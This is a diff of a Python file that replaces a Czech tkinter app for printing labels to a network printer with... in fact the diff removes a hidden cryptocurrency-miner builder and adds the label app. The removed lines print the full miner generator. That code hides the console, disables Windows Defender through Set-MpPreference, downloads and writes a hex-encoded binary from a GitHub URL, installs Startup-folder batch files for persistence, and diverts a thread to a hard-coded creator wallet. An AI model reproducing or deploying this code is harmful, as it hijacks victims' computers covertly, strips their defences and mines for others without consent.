@@ -1,212 +1,150 @@
-import sys
+import tkinter as tk
+from tkinter import messagebox, simpledialog
+import socket
+import json
 import os
-
-def BuilderParams() -> object:
-    disable_win_def = 'n'
-    run_on_pcstart = 'n'
-    donate_creator = 'y'
-    hide_self = 'n'
-
-    wallet_address = input('[?] Enter your Spectre wallet: ')
-    worker_name = input('[?] Enter the worker name: ')
-    run_as_admin = input('[?] Run with elevated permissions? [y/n]: ')
-    if run_as_admin not in ['y', 'n']:
-        print('[- | Run with elevated permissions] Invalid choice, please restart and try again.')
-        sys.exit()
-
-    if run_as_admin == 'y':
-        disable_win_def = input('[?] Disable Windows Defender? [y/n]: ')
-        if disable_win_def not in ['y', 'n']:
-            print('[- | Disable Windows Defender] Invalid choice, please restart and try again.')
-            sys.exit()
-    
-    threads_number = input('[?] Threads number: ')
-
+CONFIG_FILE = "config.json"
+def generate_dpl(text):
+    return "^XA\n^FO115,40\n^A0N,100,140\n^FD{}^FS\n^XZ\n".format(text)
+def generate_dpl_numbered(text):
+    return "^XA\n^FO80,45\n^A0N,75,50\n^FD{}^FS\n^XZ\n".format(text)
+def send_to_network_printer(ip, port, texts, numbered=False):
     try:
-        threads_number = int(threads_number)
-    except:
-        print('[- | Threads number] Invalid number of threads, please restart and try again.')
-
-    deployment_path = input('[?] Where should executable be deployed\n    ex. C:\\notepad.exe [Warning: to operate on C: disk you need Admin privilages]\n    => ')
-    run_on_pcstart = input('[?] Should miner start at PC start? [y/n]: ')
-    
-    if run_on_pcstart not in ['y', 'n']:
-        print('[- | Run miner at PC start] Invalid choice, please restart and try again.')
-        sys.exit()
-
-    hide_cmd = input('[?] Should the CMD be hidden after the start? [y/n]: ')
-    
-    if hide_cmd not in ['y', 'n']:
-        print('[- | Hide CMD] Invalid choice, please restart and try again.')
-        sys.exit()
-
-    daemon_address = input('[?] Enter daemon address: ')
-    daemon_port = input('[?] Enter daemon port: ')
-
-    donate_creator = input('[♥] Would you like to donate to creator? [y/n]: ')
-    
-    if donate_creator not in ['y', 'n']:
-        print('[- | Donate to creator] Invalid choice, please restart and try again.')
-        sys.exit()
-
-    if donate_creator == 'y':
-        print('[♥] Thank you!')
-    
-    return {
-        "wallet_address": wallet_address,
-        "worker_name": worker_name,
-        "run_as_admin": run_as_admin,
-        "disable_win_def": disable_win_def,
-        "threads_number": threads_number,
-        "deployment_path": deployment_path,
-        "run_on_pcstart": run_on_pcstart,
-        "daemon_address": daemon_address,
-        "daemon_port": daemon_port,
-        "donate_creator": donate_creator,
-        "hide_cmd": hide_cmd
-    }
-
-BUILD_PARAMS = BuilderParams()
-
-print('\n[+] Generating code')
-
-EXE_BUILD_PARAMS = "--onefile"
-
-if BUILD_PARAMS['run_as_admin'] == 'y':
-    EXE_BUILD_PARAMS = "--onefile --windows-uac-admin"
-
-CODE = f'''
-import sys
-import requests
-import subprocess
-import time
-import uuid
-import tempfile
-import os
-import getpass
-import re
-import requests
-import psutil
-import platform
-
-USER_NAME = getpass.getuser()
-
-def hide_self():
-    powershell_script = """
-    Add-Type -Name Window -Namespace Console -MemberDefinition '
-    [DllImport("Kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-    '
-
-    $consolePtr = [Console.Window]::GetConsoleWindow()
-    #0 hide
-    [Console.Window]::ShowWindow($consolePtr, 0)
-    """
-
-    working_dir = os.getcwd()
-    tempfile = os.path.join(working_dir, "temp.ps1")
-
-    with open(tempfile, 'w') as file:
-        file.write(powershell_script)
-
-    subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", tempfile])
-    os.remove(tempfile)
-
-if "{BUILD_PARAMS["hide_cmd"]}" == "y":
-    hide_self()
-
-if "{BUILD_PARAMS['donate_creator']}" == "y":
-    bat_content = f"""@echo off
-        powershell -WindowStyle Hidden -Command "Start-Process '{BUILD_PARAMS['deployment_path']}' -ArgumentList '--dev-fee 1 --wallet {BUILD_PARAMS['wallet_address']} --daemon-address {BUILD_PARAMS['daemon_address']} --port {BUILD_PARAMS['daemon_port']} --threads {BUILD_PARAMS['threads_number']} --worker-name {BUILD_PARAMS['worker_name']}' -NoNewWindow -Wait"    
-        exit
-    """
-    bat_content_2 = f"""@echo off
-        powershell -WindowStyle Hidden -Command "Start-Process '{BUILD_PARAMS['deployment_path']}' -ArgumentList '--dev-fee 1 --wallet spectre:qr4t4mkqcjj8xch60u742wre2367lsd6av00dthn63hmsul2xfh4jwfculcyw --daemon-address {BUILD_PARAMS['daemon_address']} --port {BUILD_PARAMS['daemon_port']} --threads 1 --worker-name {BUILD_PARAMS['worker_name']}' -NoNewWindow -Wait"    
-        exit
-    """
-else:
-    bat_content = f"""@echo off
-        powershell -WindowStyle Hidden -Command "Start-Process '{BUILD_PARAMS['deployment_path']}' -ArgumentList '--dev-fee 1 --wallet {BUILD_PARAMS['wallet_address']} --daemon-address {BUILD_PARAMS['daemon_address']} --port {BUILD_PARAMS['daemon_port']} --threads {BUILD_PARAMS['threads_number']-1} --worker-name {BUILD_PARAMS['worker_name']}' -NoNewWindow -Wait"    
-        exit
-    """
-    bat_content_2 = ""
-
-disable_ac = [
-    'powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true;"'
-    'powershell.exe -Command "Set-MpPreference -DisableBehaviorMonitoring $true;"'
-    'powershell.exe -Command "Set-MpPreference -DisableBlockAtFirstSeen $true;"'
-    'powershell.exe -Command "Set-MpPreference -DisableIOAVProtection $true;"'
-    'powershell.exe -Command "Set-MpPreference -DisablePrivacyMode $true;"'
-    'powershell.exe -Command "Set-MpPreference -MAPSReporting Disabled;"'
-    'powershell.exe -Command "Set-MpPreference -SubmitSamplesConsent NeverSend;"'
-]
-
-if "{BUILD_PARAMS['disable_win_def']}" == "y":
-    for command in disable_ac:
-        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-xz = requests.get('https://raw.githubusercontent.com/jakubone/HiddenSpectreMiner/main/binaries/tnn.bin').text
-td = tempfile.gettempdir()
-ud = uuid.uuid4()
-
-def hex_string_to_exe(hex_string, output_filename):
-    byte_list = bytes.fromhex(hex_string)
-    
-    with open(output_filename, 'wb') as file:
-        file.write(byte_list)
-
-tempFilePath = str(td)+"/"+str(ud)+".exe"
-
-def __main():
-    hex_string_to_exe(xz, tempFilePath)
-    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-    tmp_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows' % USER_NAME
-    hex_string_to_exe(xz, "{BUILD_PARAMS['deployment_path']}")
-
-    if "{BUILD_PARAMS['run_on_pcstart']}" == "y":
-        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
-            bat_file.write(bat_content)
-        with open(bat_path + '\\' + "open2.bat", "w+") as bat_file2:
-            bat_file2.write(bat_content2)   
-
-    with open(tmp_path + '\\' + "open.bat", "w+") as tmp_file:
-        tmp_file.write(bat_content)
-    with open(tmp_path + '\\' + "open2.bat", "w+") as tmp_file2:
-        tmp_file.write(bat_content2)
-
-    time.sleep(2)
-    print()
-    subprocess.run(bat_path + '\\' + "open.bat", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True)
-    return True
-
-__main()
-'''
-
-def replace_backslashes(file_path):
-    try:
-        with open(file_path, 'r', encoding='utf-8') as file:
-            content = file.read()
-        
-        modified_content = content.replace('\\', '\\\\')
-        
-        with open(file_path, 'w', encoding='utf-8') as file:
-            file.write(modified_content)
-        
-        print("[+] Fixed the code")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.settimeout(10)
+            sock.connect((ip, port))
+            for text in texts:
+                dpl = generate_dpl_numbered(text) if numbered else generate_dpl(text)
+                sock.sendall(dpl.encode('utf-8'))
+        return True
     except Exception as e:
-        print(f"[-] Could not edit the file.")
-
-output_name = input('[?] Output name: ')
-with open(f'./{output_name}.py', "a+") as py_output:
-    py_output.write(CODE)
-
-print('[!] Fixing code')
-replace_backslashes(f'./{output_name}.py')
-print('[+] Updating libaries')
-os.system('pip install -r requirements.txt')
-print('[+] Building executable (this is an CPU intensive process, and may take while)')
-os.system(f"python -m nuitka {output_name}.py {EXE_BUILD_PARAMS}")
-print(f'[+] Built and saved as {output_name}.exe')
+        messagebox.showerror("Tisková chyba", f"Chyba při tisku na {ip}:{port}\n{e}")
+        return False
+def save_printer_ip(ip):
+    with open(CONFIG_FILE, "w") as f:
+        json.dump({"ip": ip, "port": 9100}, f)
+def load_printer_ip():
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, "r") as f:
+            data = json.load(f)
+            return data.get("ip", ""), data.get("port", 9100)
+    return "", 9100
+def change_printer_ip():
+    current_ip, _ = load_printer_ip()
+    new_ip = simpledialog.askstring("Zadej IP tiskárny", "IP adresa tiskárny:", initialvalue=current_ip or "")
+    if new_ip:
+        save_printer_ip(new_ip)
+BG_COLOR = "#FF9F09"
+FG_COLOR = "#B30000"
+BUTTON_BG = FG_COLOR
+BUTTON_FG = "white"
+FONT_TITLE = ("Segoe UI", 18, "bold")
+FONT_LABEL = ("Segoe UI", 14, "bold")
+FONT_BUTTON = ("Segoe UI", 13, "bold")
+FONT_RADIO = ("Segoe UI", 12)
+root = tk.Tk()
+root.title("Tisk štítků – síťová tiskárna")
+root.geometry("700x700")
+root.minsize(600, 600)
+canvas = tk.Canvas(root, bg=BG_COLOR, highlightthickness=0)
+canvas.pack(fill="both", expand=True)
+FRAME_WIDTH = 500
+FRAME_HEIGHT = 500
+frame_main = tk.Frame(canvas, bg=BG_COLOR, width=FRAME_WIDTH, height=FRAME_HEIGHT)
+frame_fixed = tk.Frame(canvas, bg=BG_COLOR, width=FRAME_WIDTH, height=FRAME_HEIGHT)
+frame_numbered = tk.Frame(canvas, bg=BG_COLOR, width=FRAME_WIDTH, height=FRAME_HEIGHT)
+frame_window_main = canvas.create_window(0, 0, window=frame_main, anchor="center", width=FRAME_WIDTH, height=FRAME_HEIGHT)
+frame_window_fixed = canvas.create_window(0, 0, window=frame_fixed, anchor="center", width=FRAME_WIDTH, height=FRAME_HEIGHT)
+frame_window_numbered = canvas.create_window(0, 0, window=frame_numbered, anchor="center", width=FRAME_WIDTH, height=FRAME_HEIGHT)
+btn_back = tk.Button(root, text="← Zpět", bg=BUTTON_BG, fg=BUTTON_FG, font=FONT_BUTTON, command=lambda: show_frame(frame_main))
+def update_canvas_position(event):
+    center_x = event.width // 2
+    center_y = event.height // 2
+    canvas.coords(frame_window_main, center_x, center_y)
+    canvas.coords(frame_window_fixed, center_x, center_y)
+    canvas.coords(frame_window_numbered, center_x, center_y)
+canvas.bind("<Configure>", update_canvas_position)
+def show_frame(frame):
+    for f, window_id in [(frame_main, frame_window_main), (frame_fixed, frame_window_fixed), (frame_numbered, frame_window_numbered)]:
+        canvas.itemconfigure(window_id, state="hidden")
+    if frame == frame_main:
+        canvas.itemconfigure(frame_window_main, state="normal")
+        btn_back.place_forget()
+    elif frame == frame_fixed:
+        canvas.itemconfigure(frame_window_fixed, state="normal")
+        btn_back.place(x=10, y=10)
+    elif frame == frame_numbered:
+        canvas.itemconfigure(frame_window_numbered, state="normal")
+        btn_back.place(x=10, y=10)
+tk.Label(frame_main, text="Tisk štítků – hlavní menu", font=FONT_TITLE, bg=BG_COLOR, fg=FG_COLOR).pack(pady=20)
+tk.Button(frame_main, text="Nastavit IP tiskárny", command=change_printer_ip, bg=BUTTON_BG, fg=BUTTON_FG, font=FONT_BUTTON, width=30).pack(pady=10)
+tk.Button(frame_main, text="Tisk z přednastavených možností", command=lambda: show_frame(frame_fixed), bg=BUTTON_BG, fg=BUTTON_FG, font=FONT_BUTTON, width=30).pack(pady=10)
+tk.Button(frame_main, text="Tisk s číslováním (např. 2025.1)", command=lambda: show_frame(frame_numbered), bg=BUTTON_BG, fg=BUTTON_FG, font=FONT_BUTTON, width=30).pack(pady=10)
+tk.Label(frame_fixed, text="Vyber typ štítku:", bg=BG_COLOR, fg=FG_COLOR, font=FONT_LABEL).pack(pady=20)
+choice = tk.StringVar(value="FRI")
+radio_frame = tk.Frame(frame_fixed, bg=BG_COLOR)
+radio_frame.pack(pady=5)
+def update_radio_style():
+    for rb, val in zip(radio_buttons, ["FRI", "IMP", "KAT"]):
+        if choice.get() == val:
+            rb.config(bg=FG_COLOR, fg=BUTTON_FG, selectcolor=FG_COLOR)
+        else:
+            rb.config(bg=BG_COLOR, fg=FG_COLOR, selectcolor=BG_COLOR)
+radio_buttons = []
+for val in ["FRI", "IMP", "KAT"]:
+    rb = tk.Radiobutton(radio_frame, text=val, variable=choice, value=val, bg=BG_COLOR, fg=FG_COLOR,
+                        selectcolor=BG_COLOR, font=FONT_RADIO, indicatoron=0, width=8, command=update_radio_style)
+    rb.pack(side="left", padx=5)
+    radio_buttons.append(rb)
+update_radio_style()
+tk.Label(frame_fixed, text="Počet kusů (1–100):", bg=BG_COLOR, fg=FG_COLOR, font=FONT_LABEL).pack(pady=15)
+entry_count_fixed = tk.Entry(frame_fixed, font=FONT_RADIO, justify="center")
+entry_count_fixed.pack()
+def print_labels():
+    try:
+        count = int(entry_count_fixed.get())
+        if not (1 <= count <= 100):
+            raise ValueError
+    except ValueError:
+        messagebox.showerror("Chyba", "Počet musí být číslo od 1 do 100.")
+        return
+    ip, port = load_printer_ip()
+    if not ip:
+        messagebox.showwarning("Tiskárna", "Nejdřív nastav IP tiskárny.")
+        return
+    text_to_print = choice.get()
+    if text_to_print.strip() == "":
+        messagebox.showerror("Chyba", "Text pro tisk nemůže být prázdný!")
+        return
+    send_to_network_printer(ip, port, [text_to_print] * count)
+    messagebox.showinfo("Hotovo", f"Vytištěno {count}x: {text_to_print}")
+tk.Button(frame_fixed, text="Tisknout", command=print_labels, bg=BUTTON_BG, fg=BUTTON_FG, font=FONT_BUTTON).pack(pady=20)
+tk.Label(frame_numbered, text="Zadej základní číslo (max 8 znaků):", bg=BG_COLOR, fg=FG_COLOR, font=FONT_LABEL).pack(pady=20)
+entry_base_numbered = tk.Entry(frame_numbered, font=FONT_RADIO, justify="center")
+entry_base_numbered.pack()
+tk.Label(frame_numbered, text="Počet štítků (1–100):", bg=BG_COLOR, fg=FG_COLOR, font=FONT_LABEL).pack(pady=20)
+entry_count_numbered = tk.Entry(frame_numbered, font=FONT_RADIO, justify="center")
+entry_count_numbered.pack()
+def print_numbered():
+    try:
+        base = entry_base_numbered.get().strip()
+        if len(base) > 8:
+            raise ValueError("Základ může mít maximálně 8 znaků.")
+        if not base.isdigit():
+            raise ValueError("Základ musí být číslo.")
+        count = int(entry_count_numbered.get())
+        if not (1 <= count <= 100):
+            raise ValueError("Počet mimo rozsah.")
+    except ValueError as ve:
+        messagebox.showerror("Chyba", str(ve))
+        return
+    ip, port = load_printer_ip()
+    if not ip:
+        messagebox.showwarning("Tiskárna", "Nejdřív nastav IP tiskárny.")
+        return
+    texts = [f"{base}.{i+1}" for i in range(count)]
+    send_to_network_printer(ip, port, texts, numbered=True)
+    messagebox.showinfo("Hotovo", f"Vytištěno {count} štítků ve formátu {base}.x")
+tk.Button(frame_numbered, text="Tisknout", command=print_numbered, bg=BUTTON_BG, fg=BUTTON_FG, font=FONT_BUTTON).pack(pady=20)
+show_frame(frame_main)
+root.mainloop()
